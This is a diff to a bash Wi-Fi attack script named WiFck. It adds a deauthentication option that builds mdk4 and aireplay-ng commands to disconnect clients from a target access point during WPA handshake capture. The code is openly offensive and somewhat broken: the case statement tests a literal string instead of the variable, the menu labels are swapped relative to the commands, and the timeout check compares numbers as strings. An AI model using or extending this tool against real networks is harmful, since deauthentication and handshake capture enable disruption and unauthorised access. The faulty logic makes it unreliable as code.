@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
 
-# wifck
+# WiFck
 # https://github.com/xG4L1L30x/wifck
 # Dev: G4L1L30
 # Version: -
@@ -91,6 +91,7 @@ function change_mode() {
 	mode=$(iw $iface info | grep "type")
 	if [[ ${mode} != *'monitor'* ]]; then
 		echo -e "${in}${R}!${Q}${out} Interface doesnt supported!"
+		iface
 	else
 		echo -e "\n${in}${Y}*${Q}${out} Set ${C}${iface}${Q} to main interface"
 		sleep 2
@@ -102,7 +103,8 @@ function change_mode() {
 
 function menu() {
 	echo -e "${in}${Y} MENU ${Q}${out}\n"
-	echo -e "${in}${G}1${out}${BD} Capture Handshake"
+	echo -e "${in}${G}1${out}${BD} Capture Handshake${Q}"
+	echo -e "${in}${G}2${out}${BD} Deauthentication Attack${Q}"
 	echo -ne ${input} ; read menu_options
 	case ${menu_options} in
 		1 )
@@ -132,12 +134,44 @@ function target() {
 	essid=$(sed '1d' tmp/target.csv | cut -d, -f 14,4,1,6 | awk -F',' '{ print $4 }' | sed "${select_target}!d")
   bssid=$(sed '1d' tmp/target.csv | cut -d, -f 14,4,1,6 | awk -F',' '{ print $1 }' | sed "${select_target}!d")
   channel=$(sed '1d' tmp/target.csv | cut -d, -f 14,4,1,6 | awk -F',' '{ print $2 }' | sed "${select_target}!d")
+	if [[ ${essid} == " " ]]; then
+		essid="\033[3m*Hidden Network*"
+	fi
 	echo -e "\n${in}${Y}*${Q}${out} Target${C}${essid}${Q} locked!"
 	sleep 2
 }
 
+function deauth_option() {
+	clear
+	banner
+	echo -e "${in}${Y}${BD} DEAUTH OPTIONS ${Q}${out}\n"
+	echo -e "${in}${G}1${out}${BD} airplay-ng${Q}"
+	echo -e "${in}${G}2${out}${BD} mdk4${Q}"
+	echo -ne ${input} ; read deauth_select
+	function timeoutDeauth() {
+		echo -e "\n${in}${G}*${out} Type how many second you want to deauth (10-200)"
+		echo -ne ${input} ; read timeout_deauth
+		if [[ ${timeout_deauth} < 10 ]] || [[ -z ${timeout_deauth} ]]; then
+			echo -e "${in}${R}!${out} Too short"
+			timeoutDeauth
+		elif [[ ${timeout_deauth} > 200 ]]; then
+			echo -e "${in}${R}!${out} Too long"
+			timeoutDeauth
+		fi
+	}
+	timeoutDeauth
+	case deauth_select in
+		1 )
+			deauth="timeout ${timeout_deauth} mdk4 ${iface} d -B ${bssid} -c ${channel}"
+			;;
+		2 )
+			deauth="timeout ${timeout_deauth} aireplay-ng -0 0 -a ${bssid} --ignore-negative-one ${iface}"
+	esac
+}
+
 function capture_handshake() {
 	target
+	deauth_option
 	clear
 	banner
 	echo -e "${in}${Y}${BD} CAPTURE HANDSHAKE ${Q}${out}\n"
